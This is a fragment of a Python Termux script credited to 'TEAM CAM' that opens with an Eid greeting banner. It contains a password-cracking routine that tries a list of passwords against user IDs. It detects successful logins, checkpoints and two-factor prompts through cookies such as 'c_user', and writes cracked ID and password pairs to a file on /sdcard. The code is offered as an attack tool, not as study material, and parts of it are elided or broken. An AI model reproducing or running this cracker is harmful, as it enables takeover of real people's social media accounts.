...
┌────♣─────┐
               ...
               ❤
      Wishing everyone an early Eid from TAJUL X TEAM CAM TERMUX WORLD
               🧡
        Eid mubarak 
               💙 
       ༊᭄
...
\x1b[38;5;46m______________________________________________________
 \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : TEAM CAM
 \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m DEVELOPER : TAJUL ISLAM+TEAM CAM
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\33[1;97m[\33[1;92mTEAM CAM-👻\33[1;97m]\33[1;94m [%s/%s] \33[1;92mOK:-%s\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;34m[\033[\033[0;101mTEAM CAM\033[0m[\033[1;32mOK\033[1;34m]\033[1;32m'+uid+'\033[1;32m • \033[1;32m'+ps+'')
          ...
          #  elif 'checkpoint' in log_cookies:
              #  coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
          #      cid = coki[24:39]
             #   print('\r\r\33[1;34m TEAM CAM-CP ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/TEAM CAM-cp👻.txt', 'a').write( uid+' | '+ps+' \n')
               # cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mTEAM CAM-2F '+uid+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
